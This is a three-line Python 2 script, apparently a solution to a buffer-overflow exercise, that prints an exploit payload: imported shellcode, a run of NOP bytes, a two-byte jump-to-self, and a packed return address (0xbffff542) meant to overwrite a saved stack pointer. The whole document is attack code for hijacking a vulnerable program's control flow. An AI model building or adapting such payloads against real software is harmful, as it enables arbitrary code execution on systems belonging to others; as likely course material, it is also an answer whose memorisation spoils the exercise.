from shellcode import shellcode 
from struct import pack

print shellcode+'\x90'*87+'\xeb\xfe'+pack("<I",0xbffff542)
